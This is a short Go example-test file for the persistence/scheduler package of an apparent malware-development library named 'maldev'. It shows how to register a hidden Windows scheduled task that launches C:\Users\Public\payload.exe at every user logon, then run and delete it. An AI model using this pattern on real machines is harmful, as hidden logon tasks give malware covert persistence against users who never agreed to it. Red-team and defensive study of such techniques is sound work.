//go:build windows

package scheduler_test

import (
	"fmt"

	"github.com/oioio-space/maldev/persistence/scheduler"
)

// Create registers a scheduled task that runs at user logon.
func ExampleCreate() {
	err := scheduler.Create(`\MyTask`,
		scheduler.WithAction(`C:\Users\Public\payload.exe`),
		scheduler.WithTriggerLogon(),
		scheduler.WithHidden(),
	)
	if err != nil {
		fmt.Println("create:", err)
	}
}

// Run triggers an existing task immediately.
func ExampleRun() {
	_ = scheduler.Run(`\MyTask`)
}

// Delete removes a registered task.
func ExampleDelete() {
	_ = scheduler.Delete(`\MyTask`)
}
